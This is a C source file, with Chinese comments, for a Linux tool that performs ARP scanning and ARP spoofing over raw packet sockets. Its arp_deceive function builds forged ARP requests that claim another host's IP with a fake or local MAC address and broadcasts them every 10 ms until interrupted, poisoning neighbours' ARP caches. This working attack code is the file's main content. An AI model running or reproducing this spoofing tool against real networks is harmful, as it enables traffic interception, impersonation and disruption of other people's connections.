#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <signal.h>
#include <pthread.h>

#include "print.h"
#include "arp.h"

static int arp_send_fd;                                /* 发送arp请求的socket */           
static int arp_recv_fd;                                /* 接收arp响应的socket */                     
static char ar_sd_exit;                                /* 标记,arp请求的socket是否建立 */
static char ar_rv_exit;                                /* 标记,arp响应的socket是否建立 */
static struct sockaddr_ll sl;                          /* 设备无关的物理层地址结构 */
static struct arp_packet arp_send_buf;                 /* arp请求实体 */
static int deceive_interval_ms = 10;                   /* 每次发送欺骗数据包的时间间隔 */
static int response_waittime_s = 10;                   /* 每次发送数据包的时间间隔 */
static char flag_stop;                                 /* 停止发包的标志 */
static char mac_bcast[MAC_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; /* 广播地址 */
static char mac_trick[MAC_LEN] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06}; /* 伪装地址 */
static char mac_local[MAC_LEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; /* 本机地址 */

/***************************************************************/
/* 函  数：sig_int **********************************************/
/* 说  明：SIGINT信号处理函数 *************************************/
/* 参  数：SIGINT信号值 ******************************************/
/* 返回值：无 ****************************************************/
/***************************************************************/
static void sig_int(int signum)
{
	flag_stop = 1;
	printf("\n");
	
	return;
}

/***************************************************************/
/* 函  数：arp_init *********************************************/
/* 说  明：初始化套接字和struct sockaddr_ll ***********************/
/* 参  数：flag 0 接收arp响应套接字初始化 **************************/
/*      ：     非0 发送arp请求套接字初始化 **************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
static void arp_init(char flag)
{
	struct timeval tv_out;
	
	if(flag == 0)
	{
		if(!ar_rv_exit)
		{
			ar_rv_exit = 1;
			if((arp_recv_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
			{
				ar_rv_exit = 0;
				print_errno("%s", "Failed to create arp_receiver's socket!");
				return;
			}
			tv_out.tv_sec = 1;
			tv_out.tv_usec = 0;
			setsockopt(arp_recv_fd, SOL_SOCKET, SO_RCVTIMEO, &tv_out, sizeof(tv_out)); /* recv超时时间为1s */
		}
	}
	else
	{
		if(!ar_sd_exit)
		{
			ar_sd_exit = 1;
			if((arp_send_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
			{
				ar_sd_exit = 0;
				print_errno("%s", "Failed to create arp_sender's socket!");
				return;
			}
			memset(&arp_send_buf, 0, sizeof(arp_send_buf));
			arp_send_buf.eth_type = htons(0x0806);
			arp_send_buf.ar_hrd = htons(0x1);
			arp_send_buf.ar_pro = htons(0x0800);
			arp_send_buf.ar_hln = MAC_LEN;
			arp_send_buf.ar_pln = IP_LEN;
			arp_send_buf.ar_op = htons(0x1);
			
			memset(&sl, 0, sizeof(sl));
			sl.sll_family = AF_PACKET;
			sl.sll_protocol = htons(ETH_P_ALL);
		}
	}
	
	return;
}

/***************************************************************/
/* 函  数：arp_receive ******************************************/
/* 说  明：接收arp响应 *******************************************/
/* 参  数：无 ***************************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
static void arp_receive(char *target_ip)
{
	int ret, cnt;
	char buf[64];
	struct arp_packet arp;
	struct in_addr ip;
	
	if(inet_aton(target_ip, &ip) == 0)
    {
		print_error("%s", "Invalid IP!");
		return;
	}

    cnt = 0;
	while (1)
	{
		ret = recv(arp_recv_fd, &arp, sizeof(arp), 0);
		if(ret > 0)
		{
			/* arp操作码为2代表arp应答 */
			if(arp.ar_op == htons(0x2) && arp.ar_sip == ip.s_addr)
			{
				sprintf(buf, "IP: %s  MAC: %02x-%02x-%02x-%02x-%02x-%02x", target_ip, 
								arp.ar_sha[0], arp.ar_sha[1], arp.ar_sha[2], arp.ar_sha[3], arp.ar_sha[4], arp.ar_sha[5]);
				printf("%s\n", buf);
				return;
			}
			else
			{
				cnt++;
			}
		}
		else
		{
			cnt++;
		}
		if(cnt > 10)
		{
			
			print_error("%s", "Failed to get arp response");
			return;
		}
	}
	
	return;
}

/***************************************************************/
/* 函  数：arp_send *********************************************/
/* 说  明：发送arp包 *********************************************/
/* 参  数：buf  请求包的内容 **************************************/
/*        size 请求包的长度 **************************************/
/*        times 发送的次数 **************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
static void arp_send(int times)
{
	int i, ret;
	
	for(i = 0; i < times; i++)
	{
		ret = sendto(arp_send_fd, &arp_send_buf, sizeof(arp_send_buf), 0, (struct sockaddr*)&sl, sizeof(sl));
		if(ret < 0)
		{
			print_errno("%s", "Arp packets send error!");
			return;
		}
		else
		{
			//printf("Arp sends %d bytes!\n", ret);
		}
	}
	
	return;
}

/***************************************************************/
/* 函  数：arp_deceive ******************************************/
/* 说  明：arp欺骗 ***********************************************/
/* 参  数：deveice_name 发送数据包的网卡设备 ************************/
/*        trick_ip 伪装的ip *************************************/
/*        target_ip 目标的ip ************************************/
/*        flag 0 使用伪造mac ************************************/
/*             非0 使用本机mac **********************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void arp_deceive(char *deveice_name, char *trick_ip, char *target_ip, char flag)
{
	int i;
	struct in_addr inaddr_tmp;
	struct ifreq ifr;
	
	if(trick_ip == NULL || target_ip == NULL)
	{
		print_error("%s", "Invalid IP!");
		return;
	}
	
	arp_init(1);
	strncpy(ifr.ifr_name, deveice_name, sizeof(ifr.ifr_name) - 1);
	if(ioctl(arp_send_fd, SIOCGIFINDEX, &ifr) < 0) 
	{
        print_errno("%s", "ioctl() SIOCGIFINDEX failed!");
        return;
    }
    sl.sll_ifindex = ifr.ifr_ifindex;
    
    if(inet_aton(trick_ip, &inaddr_tmp) == 0)
    {
		print_error("%s", "Invalid IP!");
		return;
	}
	memcpy(&arp_send_buf.ar_sip, &inaddr_tmp, sizeof(inaddr_tmp));
	if(inet_aton(target_ip, &inaddr_tmp) == 0)
    {
		print_error("%s", "Invalid IP!");
		return;
	}
	memcpy(&arp_send_buf.ar_dip, &inaddr_tmp, sizeof(inaddr_tmp));
 
	memcpy(arp_send_buf.eth_dst, mac_bcast, MAC_LEN);
	if(flag)
	{
		if(ioctl(arp_send_fd, SIOCGIFHWADDR, &ifr) < 0)
		{
			print_errno("%s", "ioctl() SIOCGIFHWADDR failed!");
			return;
		}
		for(i = 0; i < MAC_LEN; i++)
		{
			mac_local[i] = ifr.ifr_hwaddr.sa_data[i];
		}
	
		memcpy(arp_send_buf.eth_src, mac_local, MAC_LEN);
		memcpy(arp_send_buf.ar_sha, mac_local, MAC_LEN);
	}
	else
	{
		memcpy(arp_send_buf.eth_src, mac_trick, MAC_LEN);
		memcpy(arp_send_buf.ar_sha, mac_trick, MAC_LEN);
	}
	memset(arp_send_buf.ar_dha, 0, MAC_LEN);
	
	signal(SIGINT, sig_int);
	while(1)
	{
		arp_send(1);
		usleep(deceive_interval_ms * 1000);
		if(flag_stop)
		{
			flag_stop = 0;
			signal(SIGINT, SIG_DFL);
			return;
		}
	}
	
	return;
}

/***************************************************************/
/* 函  数：arp_scan *********************************************/
/* 说  明：获得其他主机的mac ***************************************/
/* 参  数：deveice_name 发送数据包的网卡设备 ************************/
/*        target_ip 目标ip **************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void arp_scan(char *deveice_name, char *target_ip)
{
	int i;
	struct in_addr inaddr_tmp;
	struct ifreq ifr;
	
	arp_init(0);
	arp_init(1);
	
	strncpy(ifr.ifr_name, deveice_name, sizeof(ifr.ifr_name) - 1);
	if(ioctl(arp_send_fd, SIOCGIFINDEX, &ifr) < 0) 
	{
        print_errno("%s", "ioctl() SIOCGIFINDEX failed!");
        return;
    }
    sl.sll_ifindex = ifr.ifr_ifindex;
    
    /* 转换目标IP */
    if(inet_aton(target_ip, &inaddr_tmp) == 0)
    {
		print_error("%s", "Invalid IP!");
		return;
	}
	memcpy(&arp_send_buf.ar_dip, &inaddr_tmp, sizeof(inaddr_tmp));
	
    /* 获取本机IP */
	if(ioctl(arp_send_fd, SIOCGIFADDR, &ifr) < 0)
	{
        print_errno("%s", "ioctl() SIOCGIFADDR failed!");
        return;
    }
    arp_send_buf.ar_sip = (((struct sockaddr_in*)&(ifr.ifr_addr))->sin_addr).s_addr;
 
    /* 获取本机MAC */
    if(ioctl(arp_send_fd, SIOCGIFHWADDR, &ifr) < 0)
	{
		print_errno("%s", "ioctl() SIOCGIFHWADDR failed!");
		return;
	}
	for(i = 0; i < MAC_LEN; i++)
	{
		mac_local[i] = ifr.ifr_hwaddr.sa_data[i];
	}
	memcpy(arp_send_buf.eth_dst, mac_bcast, MAC_LEN);
	memcpy(arp_send_buf.eth_src, mac_local, MAC_LEN);
	memcpy(arp_send_buf.ar_sha, mac_local, MAC_LEN);
	memset(arp_send_buf.ar_dha, 0, MAC_LEN);
	
	arp_send(1);
	arp_receive(target_ip);
	
	return;
}

/***************************************************************/
/* 函  数：set_deceive_interval *********************************/
/* 说  明：修改每次发包的时间间隔 **********************************/
/* 参  数：毫秒 *************************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void set_deceive_interval(unsigned int interval_ms)
{
	deceive_interval_ms = interval_ms;
	printf("Deceive_interval is set %ums!\n", interval_ms);
	
	return;
}

/***************************************************************/
/* 函  数：set_scan_wait_time ***********************************/
/* 说  明：修改接收请求等待时间 ************************************/
/* 参  数：秒 *************************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void set_scan_wait_time(unsigned int wait_time_s)
{
	response_waittime_s = wait_time_s;
	printf("Response_waittime is set %us!\n", wait_time_s);
	
	return;
}

/***************************************************************/
/* 函  数：arp_reset ********************************************/
/* 说  明：重置一些参数设置 ***************************************/
/* 参  数：无 ***************************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void arp_reset()
{
	set_deceive_interval(10);
	set_scan_wait_time(10);
	
	if(ar_sd_exit)
	{
		ar_sd_exit = 0;
		close(arp_send_fd);
	}
	
	if(ar_rv_exit)
	{
		ar_rv_exit = 0;
		close(arp_recv_fd);
	}
	
	return;
}

/***************************************************************/
/* 函  数：arp_usage ********************************************/
/* 说  明：介绍arp使用方法 ****************************************/
/* 参  数：无 ***************************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void arp_usage()
{
	
	return;
}
